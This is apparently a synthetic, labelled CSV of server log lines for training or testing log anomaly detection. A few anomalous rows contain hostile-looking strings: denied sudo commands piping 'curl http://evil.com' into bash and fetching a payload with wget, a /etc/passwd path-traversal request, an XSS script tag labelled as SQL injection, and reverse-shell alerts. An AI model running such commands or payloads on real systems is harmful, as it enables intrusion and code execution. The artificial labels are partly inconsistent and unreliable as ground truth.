timestamp,log_message,label,anomaly_type
2026-01-04 09:31:59,"192.168.188.148 - - [04/Jan/2026:00:52:30 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 09:32:18,"192.168.29.3 - - [04/Jan/2026:11:18:16 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 09:32:27,kernel: [107.771029] wlan0: link up,0,normal
2026-01-04 09:32:31,Connection received: host=192.168.16.25 user=postgres database=test,0,normal
2026-01-04 09:32:51,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:32:51,MySQL server started with process id 12337,0,normal
2026-01-04 09:33:05,kernel: [714.817817] eth0: link up,0,normal
2026-01-04 09:33:06,"kernel: [930.758114] I/O error, dev eth0, sector 1495020",1,system_error
2026-01-04 09:33:25,[INFO] Application started successfully,0,normal
2026-01-04 09:33:28,"192.168.20.186 - - [03/Jan/2026:17:53:25 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 09:33:29,kernel: [485.730213] wlan0: link up,0,normal
2026-01-04 09:33:48,[ERROR] Disk space critical: / at 96% usage,1,system_error
2026-01-04 09:33:55,Received disconnect from 192.168.5.105 port 10662:11: disconnected by user,0,normal
2026-01-04 09:34:02,systemd[1]: Started mongodb.service,0,normal
2026-01-04 09:34:21,kernel: [904.212955] wlan0: link down,0,normal
2026-01-04 09:34:28,Received disconnect from 192.168.115.135 port 22108:11: disconnected by user,0,normal
2026-01-04 09:34:30,"104.248.120.134 - - [03/Jan/2026:23:18:31 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 14907",1,suspicious_network
2026-01-04 09:34:48,session closed for user mysql,0,normal
2026-01-04 09:34:49,[INFO] User nginx logged in successfully,0,normal
2026-01-04 09:34:51,"192.168.215.49 - - [03/Jan/2026:23:51:35 +0700] ""GET /index.html HTTP/1.1"" 200 6427",0,normal
2026-01-04 09:35:00,Accepted password for nginx from 192.168.161.204 port 8752 ssh2,0,normal
2026-01-04 09:35:05,session opened for user user by (uid=0),0,normal
2026-01-04 09:35:06,[INFO] User root logged in successfully,0,normal
2026-01-04 09:35:14,session closed for user admin,0,normal
2026-01-04 09:35:20,Received disconnect from 192.168.39.251 port 13235:11: disconnected by user,0,normal
2026-01-04 09:35:43,[INFO] Cache hit for key: cache_key_896,0,normal
2026-01-04 09:35:44,kernel: [876.781409] eth1: link up,0,normal
2026-01-04 09:35:44,ALERT: Reverse shell connection attempt to 104.248.48.87:4748,1,malware_indicator
2026-01-04 09:35:48,session opened for user mysql by (uid=0),0,normal
2026-01-04 09:35:48,[INFO] Request processed in 1346ms,0,normal
2026-01-04 09:35:49,Connection received: host=192.168.238.207 user=guest database=staging,0,normal
2026-01-04 09:36:15,systemd[1]: Started ssh.service,0,normal
2026-01-04 09:36:32,Received disconnect from 192.168.200.32 port 8883:11: disconnected by user,0,normal
2026-01-04 09:36:41,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 09:36:53,[INFO] Request processed in 3250ms,0,normal
2026-01-04 09:36:58,WARNING: Unauthorized file modification: /css/style.css,1,malware_indicator
2026-01-04 09:37:08,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 09:37:13,session closed for user postgres,0,normal
2026-01-04 09:37:37,MySQL server started with process id 41768,0,normal
2026-01-04 09:37:42,Accepted password for user from 192.168.59.45 port 59283 ssh2,0,normal
2026-01-04 09:37:42,systemd[1]: Starting redis.service...,0,normal
2026-01-04 09:37:46,MySQL server started with process id 23496,0,normal
2026-01-04 09:37:48,session closed for user apache,0,normal
2026-01-04 09:37:56,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:38:02,[INFO] Cache hit for key: cache_key_616,0,normal
2026-01-04 09:38:25,Accepted password for admin from 192.168.132.172 port 63313 ssh2,0,normal
2026-01-04 09:39:04,[INFO] Application started successfully,0,normal
2026-01-04 09:39:07,Connection received: host=192.168.86.183 user=apache database=production,0,normal
2026-01-04 09:39:08,Accepted password for mysql from 192.168.139.72 port 59803 ssh2,0,normal
2026-01-04 09:39:40,systemd[1]: Started postgresql.service,0,normal
2026-01-04 09:39:53,[DEBUG] Processing request from 192.168.152.149,0,normal
2026-01-04 09:39:58,Received disconnect from 192.168.104.27 port 9511:11: disconnected by user,0,normal
2026-01-04 09:40:02,[INFO] User admin logged in successfully,0,normal
2026-01-04 09:40:04,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 09:40:06,kernel: [663.357526] br-0: link up,0,normal
2026-01-04 09:40:22,[INFO] Cache hit for key: cache_key_231,0,normal
2026-01-04 09:40:31,session opened for user guest by (uid=0),0,normal
2026-01-04 09:40:34,"192.168.211.216 - - [04/Jan/2026:03:42:44 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-04 09:40:47,[INFO] Application started successfully,0,normal
2026-01-04 09:40:48,kernel: [331.207074] wlan0: link down,0,normal
2026-01-04 09:41:00,[INFO] Request processed in 511ms,0,normal
2026-01-04 09:41:10,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 09:41:11,Received disconnect from 192.168.233.143 port 2353:11: disconnected by user,0,normal
2026-01-04 09:41:21,"192.168.220.208 - - [04/Jan/2026:01:32:52 +0700] ""POST / HTTP/1.1"" 200 33173",0,normal
2026-01-04 09:41:26,"192.168.28.173 - - [03/Jan/2026:22:50:33 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 09:41:42,[INFO] Request processed in 1033ms,0,normal
2026-01-04 09:41:43,kernel: [113.506368] br-0: link down,0,normal
2026-01-04 09:42:02,MySQL server started with process id 31758,0,normal
2026-01-04 09:42:19,Received disconnect from 192.168.32.31 port 6219:11: disconnected by user,0,normal
2026-01-04 09:42:50,Accepted password for postgres from 192.168.87.245 port 7532 ssh2,0,normal
2026-01-04 09:43:06,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 09:43:09,session opened for user root by (uid=0),0,normal
2026-01-04 09:43:17,[INFO] Cache hit for key: cache_key_519,0,normal
2026-01-04 09:43:27,[INFO] Application started successfully,0,normal
2026-01-04 09:43:28,[DEBUG] Processing request from 192.168.244.220,0,normal
2026-01-04 09:43:29,[DEBUG] Processing request from 192.168.84.143,0,normal
2026-01-04 09:43:40,Accepted password for nginx from 192.168.215.9 port 18738 ssh2,0,normal
2026-01-04 09:43:41,Accepted password for www-data from 192.168.208.222 port 40013 ssh2,0,normal
2026-01-04 09:43:50,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 09:44:09,"192.168.215.142 - - [04/Jan/2026:06:20:18 +0700] ""GET / HTTP/1.1"" 200 24662",0,normal
2026-01-04 09:44:09,"192.168.202.164 - - [04/Jan/2026:08:22:30 +0700] ""POST /images/logo.png HTTP/1.1"" 200 2534",0,normal
2026-01-04 09:44:17,systemd[1]: Started nginx.service,0,normal
2026-01-04 09:44:23,systemd[1]: Starting redis.service...,0,normal
2026-01-04 09:44:24,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 09:44:25,"192.168.149.222 - - [04/Jan/2026:08:43:12 +0700] ""POST /css/style.css HTTP/1.1"" 200 42730",0,normal
2026-01-04 09:44:29,Connection received: host=192.168.1.135 user=apache database=users,0,normal
2026-01-04 09:44:33,"192.168.210.240 - - [03/Jan/2026:15:23:23 +0700] ""POST /index.html HTTP/1.1"" 200 48836",0,normal
2026-01-04 09:44:35,su: FAILED SU (to root) mysql on pts/0,1,privilege_escalation
2026-01-04 09:44:39,"192.168.82.52 - - [03/Jan/2026:23:35:13 +0700] ""GET /images/logo.png HTTP/1.1"" 200 42436",0,normal
2026-01-04 09:44:51,"192.168.246.189 - - [03/Jan/2026:23:38:19 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 39835",0,normal
2026-01-04 09:44:54,[INFO] Application started successfully,0,normal
2026-01-04 09:44:58,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:45:02,Connection received: host=192.168.139.146 user=postgres database=test,0,normal
2026-01-04 09:45:05,"192.168.81.87 - - [03/Jan/2026:23:23:33 +0700] ""POST /admin HTTP/1.1"" 200 13620",0,normal
2026-01-04 09:45:09,Received disconnect from 192.168.207.240 port 52334:11: disconnected by user,0,normal
2026-01-04 09:45:11,[INFO] Application started successfully,0,normal
2026-01-04 09:45:13,systemd[1]: Starting docker.service...,0,normal
2026-01-04 09:45:19,Received disconnect from 192.168.23.172 port 15454:11: disconnected by user,0,normal
2026-01-04 09:45:23,kernel: [283.535469] br-0: link up,0,normal
2026-01-04 09:45:33,"192.168.76.211 - - [04/Jan/2026:08:36:49 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 09:45:39,systemd[1]: Started ssh.service,0,normal
2026-01-04 09:45:53,Connection received: host=192.168.222.149 user=www-data database=analytics,0,normal
2026-01-04 09:45:55,session closed for user user,0,normal
2026-01-04 09:46:00,ALERT: Unauthorized privilege escalation attempt by postgres,1,privilege_escalation
2026-01-04 09:46:12,[INFO] Application started successfully,0,normal
2026-01-04 09:46:23,systemd[1]: Starting apache2.service...,0,normal
2026-01-04 09:46:42,"192.168.18.90 - - [03/Jan/2026:15:19:35 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-04 09:46:53,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:46:58,kernel: [421.596751] wlan0: link down,0,normal
2026-01-04 09:46:59,session opened for user postgres by (uid=0),0,normal
2026-01-04 09:47:22,Received disconnect from 192.168.175.214 port 14163:11: disconnected by user,0,normal
2026-01-04 09:47:22,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:47:24,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:47:25,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:47:28,[INFO] Request processed in 2046ms,0,normal
2026-01-04 09:47:31,Accepted password for postgres from 192.168.58.7 port 32506 ssh2,0,normal
2026-01-04 09:47:37,[INFO] Application started successfully,0,normal
2026-01-04 09:47:38,[INFO] Request processed in 2665ms,0,normal
2026-01-04 09:47:47,Accepted password for guest from 192.168.219.246 port 36666 ssh2,0,normal
2026-01-04 09:47:49,Connection received: host=192.168.164.85 user=postgres database=staging,0,normal
2026-01-04 09:47:55,Failed password for user from 185.220.159.82 port 49676 ssh2,1,brute_force
2026-01-04 09:48:01,session closed for user postgres,0,normal
2026-01-04 09:48:03,"192.168.200.52 - - [03/Jan/2026:20:17:04 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-04 09:48:19,Received disconnect from 192.168.70.194 port 23864:11: disconnected by user,0,normal
2026-01-04 09:48:21,kernel: [423.895511] eth0: link down,0,normal
2026-01-04 09:48:22,PAM: Authentication failure for root from 104.248.48.244,1,brute_force
2026-01-04 09:48:28,[INFO] Request processed in 4285ms,0,normal
2026-01-04 09:48:40,MySQL server started with process id 61436,0,normal
2026-01-04 09:48:41,Received disconnect from 192.168.16.254 port 18616:11: disconnected by user,0,normal
2026-01-04 09:48:42,"192.168.117.17 - - [04/Jan/2026:01:52:19 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 09:48:45,Accepted password for guest from 192.168.220.7 port 14736 ssh2,0,normal
2026-01-04 09:49:15,MySQL server started with process id 9410,0,normal
2026-01-04 09:49:18,systemd[1]: Started cron.service,0,normal
2026-01-04 09:49:21,"192.168.80.22 - - [03/Jan/2026:18:37:13 +0700] ""GET /admin HTTP/1.1"" 200 15916",0,normal
2026-01-04 09:49:25,[INFO] User user logged in successfully,0,normal
2026-01-04 09:49:27,[INFO] User www-data logged in successfully,0,normal
2026-01-04 09:49:35,Received disconnect from 192.168.175.142 port 51517:11: disconnected by user,0,normal
2026-01-04 09:49:36,Connection received: host=192.168.151.207 user=guest database=users,0,normal
2026-01-04 09:49:38,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:49:58,systemd[1]: Starting docker.service...,0,normal
2026-01-04 09:50:03,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:50:04,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 09:50:11,session closed for user root,0,normal
2026-01-04 09:50:30,[DEBUG] Processing request from 192.168.25.146,0,normal
2026-01-04 09:51:00,[INFO] Request processed in 446ms,0,normal
2026-01-04 09:51:25,session closed for user admin,0,normal
2026-01-04 09:51:29,[DEBUG] Processing request from 192.168.106.7,0,normal
2026-01-04 09:51:30,[INFO] Application started successfully,0,normal
2026-01-04 09:51:50,kernel: [887.284528] wlan0: link up,0,normal
2026-01-04 09:52:07,[DEBUG] Processing request from 192.168.37.185,0,normal
2026-01-04 09:52:21,[INFO] Application started successfully,0,normal
2026-01-04 09:52:27,"192.168.198.173 - - [04/Jan/2026:08:24:29 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 09:52:29,"192.168.152.7 - - [04/Jan/2026:00:19:28 +0700] ""POST /api/v1/data HTTP/1.1"" 200 5675",0,normal
2026-01-04 09:52:45,Failed password for root from 104.248.95.192 port 14518 ssh2,1,brute_force
2026-01-04 09:52:53,[INFO] Cache hit for key: cache_key_577,0,normal
2026-01-04 09:52:59,[INFO] Cache hit for key: cache_key_353,0,normal
2026-01-04 09:52:59,kernel: [103.631597] wlan0: link down,0,normal
2026-01-04 09:52:59,[INFO] Cache hit for key: cache_key_653,0,normal
2026-01-04 09:53:09,MySQL server started with process id 10740,0,normal
2026-01-04 09:53:12,MySQL server started with process id 61355,0,normal
2026-01-04 09:53:17,ALERT: Suspicious process detected: reverse_shell (PID: 45729),1,malware_indicator
2026-01-04 09:53:17,systemd[1]: Stopped redis.service,0,normal
2026-01-04 09:53:19,[DEBUG] Processing request from 192.168.137.18,0,normal
2026-01-04 09:53:38,user: user NOT in sudoers; TTY=pts/0; PWD=/home/user; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 09:53:44,[INFO] Application started successfully,0,normal
2026-01-04 09:53:48,kernel: Out of memory: Kill process 4399 (cryptominer) score 246,1,system_error
2026-01-04 09:53:57,[ERROR] Disk space critical: / at 91% usage,1,system_error
2026-01-04 09:54:02,[INFO] Cache hit for key: cache_key_338,0,normal
2026-01-04 09:54:20,[INFO] Application started successfully,0,normal
2026-01-04 09:54:23,systemd[1]: Started redis.service,0,normal
2026-01-04 09:54:27,[INFO] Cache hit for key: cache_key_610,0,normal
2026-01-04 09:54:37,Connection received: host=192.168.199.48 user=user database=production,0,normal
2026-01-04 09:54:43,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 09:54:55,"192.168.249.172 - - [04/Jan/2026:11:03:56 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 09:55:06,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:55:25,"192.168.180.60 - - [04/Jan/2026:05:34:34 +0700] ""GET /admin HTTP/1.1"" 200 40559",0,normal
2026-01-04 09:55:27,"192.168.2.151 - - [04/Jan/2026:05:18:04 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 09:55:31,systemd[1]: Started docker.service,0,normal
2026-01-04 09:55:36,kernel: [391.217458] eth1: link down,0,normal
2026-01-04 09:55:36,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 09:55:40,kernel: [655.174299] eth1: link down,0,normal
2026-01-04 09:55:40,"192.168.98.35 - - [03/Jan/2026:18:30:24 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 4599",0,normal
2026-01-04 09:55:42,[INFO] Request processed in 116ms,0,normal
2026-01-04 09:55:49,[INFO] Request processed in 665ms,0,normal
2026-01-04 09:55:55,MySQL server started with process id 2578,0,normal
2026-01-04 09:56:01,[INFO] User nginx logged in successfully,0,normal
2026-01-04 09:56:09,"kernel: [691.768479] I/O error, dev eth1, sector 5411819",1,system_error
2026-01-04 09:56:14,[INFO] Cache hit for key: cache_key_123,0,normal
2026-01-04 09:56:20,"45.33.23.37 - - [03/Jan/2026:14:23:09 +0700] ""POST /login HTTP/1.1"" 401 24137",1,suspicious_network
2026-01-04 09:56:23,Accepted password for admin from 192.168.49.175 port 49849 ssh2,0,normal
2026-01-04 09:56:24,[INFO] Cache hit for key: cache_key_706,0,normal
2026-01-04 09:56:28,systemd[1]: Stopped cron.service,0,normal
2026-01-04 09:56:31,"192.168.218.67 - - [03/Jan/2026:17:54:50 +0700] ""GET /css/style.css HTTP/1.1"" 200 27118",0,normal
2026-01-04 09:56:42,kernel: [832.660489] eth0: link up,0,normal
2026-01-04 09:56:51,[DEBUG] Processing request from 192.168.203.165,0,normal
2026-01-04 09:56:58,"192.168.87.142 - - [04/Jan/2026:02:15:37 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 09:57:05,"192.168.51.28 - - [04/Jan/2026:00:55:55 +0700] ""GET /images/logo.png HTTP/1.1"" 200 9478",0,normal
2026-01-04 09:57:09,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:57:09,ALERT: Unauthorized privilege escalation attempt by apache,1,privilege_escalation
2026-01-04 09:57:14,systemd[1]: Started redis.service,0,normal
2026-01-04 09:57:20,"185.220.34.155 - - [04/Jan/2026:05:49:37 +0700] ""POST /login HTTP/1.1"" 401 13930",1,suspicious_network
2026-01-04 09:57:32,Accepted password for mysql from 192.168.223.227 port 43583 ssh2,0,normal
2026-01-04 09:58:03,Connection received: host=192.168.180.44 user=postgres database=users,0,normal
2026-01-04 09:58:07,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=104.248.178.219,1,brute_force
2026-01-04 09:58:17,Accepted password for guest from 192.168.220.69 port 21324 ssh2,0,normal
2026-01-04 09:58:21,[DEBUG] Processing request from 192.168.79.239,0,normal
2026-01-04 09:58:27,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 09:58:36,systemd[1]: Started mongodb.service,0,normal
2026-01-04 09:58:36,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:58:49,"45.33.71.111 - - [04/Jan/2026:01:10:47 +0700] ""POST /login HTTP/1.1"" 401 44560",1,suspicious_network
2026-01-04 09:59:13,"192.168.181.4 - - [04/Jan/2026:07:43:22 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 09:59:24,[INFO] Cache hit for key: cache_key_501,0,normal
2026-01-04 09:59:27,[INFO] User admin logged in successfully,0,normal
2026-01-04 09:59:31,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 09:59:32,systemd[1]: Starting cron.service...,0,normal
2026-01-04 09:59:49,kernel: [632.971315] wlan0: link down,0,normal
2026-01-04 10:00:03,Connection received: host=192.168.75.132 user=user database=users,0,normal
2026-01-04 10:00:17,kernel: [657.792538] eth0: link down,0,normal
2026-01-04 10:00:19,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:00:20,systemd[1]: Stopped cron.service,0,normal
2026-01-04 10:00:23,MySQL server started with process id 33757,0,normal
2026-01-04 10:00:32,MySQL server started with process id 45887,0,normal
2026-01-04 10:01:00,[DEBUG] Processing request from 192.168.57.181,0,normal
2026-01-04 10:01:08,error: maximum authentication attempts exceeded for user from 104.248.96.227,1,brute_force
2026-01-04 10:01:22,sudo: admin : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=curl http://evil.com | bash,1,privilege_escalation
2026-01-04 10:01:25,[DEBUG] Processing request from 192.168.99.113,0,normal
2026-01-04 10:01:26,systemd[1]: ssh.service failed,1,system_error
2026-01-04 10:01:35,ALERT: Unauthorized privilege escalation attempt by user,1,privilege_escalation
2026-01-04 10:01:38,kernel: [57.376630] eth1: link down,0,normal
2026-01-04 10:01:41,[INFO] User root logged in successfully,0,normal
2026-01-04 10:01:42,systemd[1]: Started apache2.service,0,normal
2026-01-04 10:01:45,[INFO] User mysql logged in successfully,0,normal
2026-01-04 10:01:52,session closed for user guest,0,normal
2026-01-04 10:01:59,MySQL server started with process id 7606,0,normal
2026-01-04 10:02:00,session closed for user user,0,normal
2026-01-04 10:02:03,"192.168.39.60 - - [04/Jan/2026:09:57:05 +0700] ""POST /index.html HTTP/1.1"" 200 15107",0,normal
2026-01-04 10:02:03,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 10:02:10,systemd[1]: Started docker.service,0,normal
2026-01-04 10:02:10,kernel: [376.150772] eth1: link down,0,normal
2026-01-04 10:02:44,"192.168.119.68 - - [04/Jan/2026:03:36:10 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 10:02:55,[INFO] Application started successfully,0,normal
2026-01-04 10:03:01,kernel: [623.156553] eth0: link down,0,normal
2026-01-04 10:03:18,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:03:30,[INFO] User apache logged in successfully,0,normal
2026-01-04 10:03:46,[INFO] Application started successfully,0,normal
2026-01-04 10:03:52,systemd[1]: Started mysql.service,0,normal
2026-01-04 10:04:03,"192.168.194.204 - - [04/Jan/2026:12:51:31 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 10:04:04,[INFO] Cache hit for key: cache_key_63,0,normal
2026-01-04 10:04:06,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:04:07,kernel: [341.158294] eth1: link down,0,normal
2026-01-04 10:04:13,MySQL server started with process id 13870,0,normal
2026-01-04 10:04:16,[INFO] User guest logged in successfully,0,normal
2026-01-04 10:04:26,[DEBUG] Processing request from 192.168.27.53,0,normal
2026-01-04 10:04:31,systemd[1]: Started ssh.service,0,normal
2026-01-04 10:04:36,kernel: [987.499862] eth1: link down,0,normal
2026-01-04 10:04:45,MySQL server started with process id 45656,0,normal
2026-01-04 10:05:02,kernel: [715.520040] docker0: link down,0,normal
2026-01-04 10:05:21,kernel: [642.974523] wlan0: link up,0,normal
2026-01-04 10:05:41,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:05:52,Received disconnect from 192.168.94.243 port 37436:11: disconnected by user,0,normal
2026-01-04 10:06:04,systemd[1]: Stopped cron.service,0,normal
2026-01-04 10:06:40,kernel: [576.177389] eth1: link down,0,normal
2026-01-04 10:07:04,Accepted password for mysql from 192.168.129.186 port 24641 ssh2,0,normal
2026-01-04 10:07:04,Received disconnect from 192.168.148.88 port 10618:11: disconnected by user,0,normal
2026-01-04 10:07:04,systemd[1]: Started apache2.service,0,normal
2026-01-04 10:07:09,Received disconnect from 192.168.245.41 port 22502:11: disconnected by user,0,normal
2026-01-04 10:07:26,WARNING: Cryptominer activity detected on process 32544,1,malware_indicator
2026-01-04 10:07:27,"192.168.14.195 - - [04/Jan/2026:08:53:36 +0700] ""POST /admin HTTP/1.1"" 200 30354",0,normal
2026-01-04 10:08:06,[INFO] Application started successfully,0,normal
2026-01-04 10:08:16,Accepted password for mysql from 192.168.59.68 port 62111 ssh2,0,normal
2026-01-04 10:08:16,session opened for user nginx by (uid=0),0,normal
2026-01-04 10:08:24,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 10:08:33,session closed for user root,0,normal
2026-01-04 10:08:39,systemd[1]: Started mongodb.service,0,normal
2026-01-04 10:08:40,Received disconnect from 192.168.133.102 port 28217:11: disconnected by user,0,normal
2026-01-04 10:08:44,systemd[1]: Started apache2.service,0,normal
2026-01-04 10:09:00,"192.168.111.65 - - [04/Jan/2026:07:12:51 +0700] ""POST /images/logo.png HTTP/1.1"" 200 37334",0,normal
2026-01-04 10:09:01,systemd[1]: Started docker.service,0,normal
2026-01-04 10:09:04,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 10:09:04,[INFO] Cache hit for key: cache_key_941,0,normal
2026-01-04 10:09:09,Received disconnect from 192.168.185.101 port 41014:11: disconnected by user,0,normal
2026-01-04 10:09:12,kernel: [846.658814] eth0: link up,0,normal
2026-01-04 10:09:22,MySQL server started with process id 10172,0,normal
2026-01-04 10:09:25,Accepted password for www-data from 192.168.221.157 port 29816 ssh2,0,normal
2026-01-04 10:09:30,[INFO] User root logged in successfully,0,normal
2026-01-04 10:09:33,Possible SQL injection attack from 192.42.94.212: <script>alert('xss')</script>,1,suspicious_network
2026-01-04 10:09:41,[INFO] User mysql logged in successfully,0,normal
2026-01-04 10:09:48,"192.168.33.184 - - [03/Jan/2026:19:44:28 +0700] ""GET /index.html HTTP/1.1"" 200 9975",0,normal
2026-01-04 10:10:04,kernel: [886.260832] docker0: link up,0,normal
2026-01-04 10:10:06,kernel: [901.584553] br-0: link down,0,normal
2026-01-04 10:10:06,MySQL server started with process id 4464,0,normal
2026-01-04 10:10:15,kernel: [581.428583] eth0: link up,0,normal
2026-01-04 10:10:16,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 10:10:22,error: maximum authentication attempts exceeded for mysql from 185.220.167.3,1,brute_force
2026-01-04 10:10:26,systemd[1]: Started mysql.service,0,normal
2026-01-04 10:10:29,systemd[1]: redis.service failed,1,system_error
2026-01-04 10:10:37,"192.168.223.46 - - [03/Jan/2026:23:26:40 +0700] ""GET /index.html HTTP/1.1"" 200 5275",0,normal
2026-01-04 10:10:39,Received disconnect from 192.168.57.103 port 6405:11: disconnected by user,0,normal
2026-01-04 10:10:40,"kernel: [373.297909] I/O error, dev br-0, sector 3857434",1,system_error
2026-01-04 10:10:49,[INFO] Cache hit for key: cache_key_70,0,normal
2026-01-04 10:10:55,session closed for user admin,0,normal
2026-01-04 10:11:07,[INFO] User nginx logged in successfully,0,normal
2026-01-04 10:11:21,MySQL server started with process id 17477,0,normal
2026-01-04 10:11:22,systemd[1]: Started docker.service,0,normal
2026-01-04 10:11:29,MySQL server started with process id 2515,0,normal
2026-01-04 10:11:44,kernel: [283.690719] eth0: link up,0,normal
2026-01-04 10:11:45,"185.220.140.235 - - [03/Jan/2026:19:16:25 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 48163",1,suspicious_network
2026-01-04 10:11:52,MySQL server started with process id 25186,0,normal
2026-01-04 10:11:56,systemd[1]: Started cron.service,0,normal
2026-01-04 10:12:01,"192.168.250.49 - - [03/Jan/2026:17:04:10 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 43392",0,normal
2026-01-04 10:12:04,su: FAILED SU (to root) postgres on pts/0,1,privilege_escalation
2026-01-04 10:12:28,systemd[1]: Stopped cron.service,0,normal
2026-01-04 10:12:35,[INFO] Application started successfully,0,normal
2026-01-04 10:12:45,sudo: postgres : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=wget http://malware.com/payload,1,privilege_escalation
2026-01-04 10:12:49,kernel: [754.376867] eth0: link up,0,normal
2026-01-04 10:12:56,systemd[1]: Stopped redis.service,0,normal
2026-01-04 10:13:07,Connection received: host=192.168.232.132 user=mysql database=staging,0,normal
2026-01-04 10:13:07,session opened for user user by (uid=0),0,normal
2026-01-04 10:13:28,systemd[1]: ssh.service failed,1,system_error
2026-01-04 10:13:32,Received disconnect from 192.168.62.169 port 24131:11: disconnected by user,0,normal
2026-01-04 10:13:43,Accepted password for postgres from 192.168.242.191 port 50648 ssh2,0,normal
2026-01-04 10:13:52,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 10:14:00,session opened for user guest by (uid=0),0,normal
2026-01-04 10:14:08,Connection received: host=192.168.105.225 user=nginx database=staging,0,normal
2026-01-04 10:14:29,"192.168.23.140 - - [03/Jan/2026:18:57:22 +0700] ""GET /css/style.css HTTP/1.1"" 200 11162",0,normal
2026-01-04 10:14:38,kernel: [628.470247] eth1: link up,0,normal
2026-01-04 10:14:47,Accepted password for apache from 192.168.186.206 port 49034 ssh2,0,normal
2026-01-04 10:14:50,Received disconnect from 192.168.251.76 port 60265:11: disconnected by user,0,normal
2026-01-04 10:14:51,[INFO] User www-data logged in successfully,0,normal
2026-01-04 10:14:51,[INFO] Application started successfully,0,normal
2026-01-04 10:14:59,Accepted password for user from 192.168.204.164 port 44425 ssh2,0,normal
